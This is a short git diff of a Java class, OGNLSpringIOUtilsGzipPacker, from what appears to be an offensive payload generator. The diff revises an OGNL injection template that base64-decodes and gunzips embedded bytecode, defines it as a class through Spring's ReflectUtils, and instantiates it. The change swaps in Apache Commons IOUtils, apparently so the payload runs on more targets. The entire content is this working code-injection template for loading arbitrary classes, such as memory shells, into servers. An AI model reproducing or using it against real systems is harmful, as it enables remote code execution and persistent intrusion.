@@ -14,7 +14,7 @@ import java.util.zip.GZIPOutputStream;
  * @since 2025/7/7
  */
 public class OGNLSpringIOUtilsGzipPacker implements Packer {
-    String template = "@org.springframework.cglib.core.ReflectUtils@defineClass('{{className}}',@org.springframework.util.StreamUtils@copyToByteArray(new java.util.zip.GZIPInputStream(new java.io.ByteArrayInputStream(@org.springframework.util.Base64Utils@decodeFromString('{{base64Str}}')))),@java.lang.Thread@currentThread().getContextClassLoader(),null,@java.lang.Class@forName('org.springframework.expression.ExpressionParser')).newInstance()";
+    String template = "(@org.springframework.cglib.core.ReflectUtils@defineClass('{{className}}',@org.apache.commons.io.IOUtils@toByteArray(new java.util.zip.GZIPInputStream(new java.io.ByteArrayInputStream(@org.springframework.util.Base64Utils@decodeFromString('{{base64Str}}')))),@java.lang.Thread@currentThread().getContextClassLoader())).newInstance()";
 
     @Override
     @SneakyThrows
